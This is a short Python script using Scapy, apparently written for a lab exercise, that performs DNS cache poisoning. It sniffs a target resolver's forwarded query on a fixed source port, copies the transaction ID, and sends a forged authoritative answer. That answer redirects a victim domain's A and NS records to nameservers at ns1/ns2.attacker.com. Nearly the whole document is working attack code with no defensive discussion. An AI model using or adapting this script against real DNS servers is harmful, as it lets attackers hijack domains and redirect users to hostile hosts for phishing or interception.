#!/usr/bin/env python3
from scapy.all import *

# 可按需要修改
FORWARDER_IP = "8.8.8.8"        # 服务器配置里用作 forwarder 的地址
FIXED_SPORT  = 33333            # 你已把 DNS 的 query source 固定为 33333
ATTACKER_IP  = "10.10.10.100"   # ns1/ns2.attacker.com 的 A 记录要指向的地址

def forge_and_send(target_dns_ip, qname, txid, victim_domain, responder_ip):
    pkt = (
        IP(src=responder_ip, dst=target_dns_ip) /
        UDP(sport=53, dport=FIXED_SPORT) /
        DNS(
            id=txid, qr=1, aa=1, rd=0, ra=0,
            qd=DNSQR(qname=qname),
            an=DNSRR(rrname=victim_domain, type="A", ttl=303030, rdata="10.10.10.1"),
            ns=DNSRR(rrname=victim_domain, type="NS", ttl=90000, rdata="ns1.attacker.com") /
               DNSRR(rrname=victim_domain, type="NS", ttl=90000, rdata="ns2.attacker.com"),
            ar=DNSRR(rrname="ns1.attacker.com", type="A", ttl=90000, rdata=ATTACKER_IP) /
               DNSRR(rrname="ns2.attacker.com", type="A", ttl=90000, rdata=ATTACKER_IP),
        )
    )
    send(pkt, verbose=0)

    print(f"[+] Sent forged reply: id={txid}, qname={qname.decode() if isinstance(qname, bytes) else qname}")

def dns_poison_once(target_dns_ip, victim_domain):
    """
    嗅探一次目标DNS发往 8.8.8.8:53 的查询（源口固定为33333），拿到 id 和 qname 后立即伪造响应
    """
    print(f"[*] Sniffing query from {target_dns_ip}:{FIXED_SPORT} -> {FORWARDER_IP}:53 ...")

    done = {"sent": False}

    def on_pkt(pkt):
        if (pkt.haslayer(DNS) and pkt[DNS].qd and
            pkt[IP].src == target_dns_ip and pkt[UDP].sport == FIXED_SPORT and
            pkt[UDP].dport == 53):

            qname = pkt[DNS].qd.qname
            txid  = pkt[DNS].id
            responder_ip = pkt[IP].dst  # DNS 正在询问的那台服务器

            # 仅对目标域名（或其子域）下手
            if (victim_domain.encode() if isinstance(qname, bytes) else victim_domain) in qname:
                forge_and_send(target_dns_ip, qname, txid, victim_domain, responder_ip)
                done["sent"] = True


    # 只要在同网段，BPF 过滤能抓到：源是目标 DNS:33333，目的 8.8.8.8:53
    bpf = f"udp and src host {target_dns_ip} and src port {FIXED_SPORT} and dst port 53"
    sniff(filter=bpf, prn=on_pkt, stop_filter=lambda p: done["sent"], timeout=30)

if __name__ == "__main__":
    target_dns = "10.10.10.53"     # 目标 DNS 服务器
    victim_domain = "example.net."  # 注意末尾点符合DNS规范
    dns_poison_once(target_dns, victim_domain)
